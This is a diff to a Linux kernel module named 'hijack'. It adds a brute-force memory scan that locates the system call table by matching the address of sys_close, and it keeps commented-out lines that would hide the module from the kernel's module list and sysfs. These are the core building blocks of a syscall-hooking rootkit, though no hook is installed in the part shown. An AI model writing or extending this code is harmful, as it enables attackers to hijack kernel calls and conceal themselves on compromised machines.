@@ -21,15 +21,49 @@
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
+#include <linux/kobject.h>
+#include <linux/unistd.h>
+#include <linux/syscalls.h>
+#include <linux/string.h>
+#include <linux/slab.h>
 
+#if defined(__i386__)
+#define START_CHECK 0xc0000000
+#define END_CHECK 0xd0000000
+typedef unsigned int psize;
+#else
+#define START_CHECK 0xffffffff81000000
+#define END_CHECK 0xffffffffa2000000
+typedef unsigned long psize;
+#endif
+
+psize *sys_call_table;
+psize **find(void) {
+ psize **sctable;
+ psize i = START_CHECK;
+ while (i < END_CHECK) {
+  sctable = (psize **) i;
+  if (sctable[__NR_close] == (psize *) sys_close) {
+   return &sctable[0];
+  }
+  i += sizeof(void *);
+ }
+ return NULL;
+}
 // Kernel live patch 
 //#include <linux/livepatch.h>
 
 
 int hijack_init(void) {
-//  list_del_init(&__this_module.list);
-//  kobject_del(&THIS_MODULE->mkobj.kobj);
+  //  list_del_init(&__this_module.list);
+  //  kobject_del(&THIS_MODULE->mkobj.kobj);
 
+
+  if (sys_call_table = (psize *) find()) {
+    printk("hijack: sys_call_table found at %p\n",sys_call_table);
+  } else {
+    printk("hijack: sys_call_table not found\n");
+  }
   printk("hijack: LKM loaded\n");
   return 0;
 }
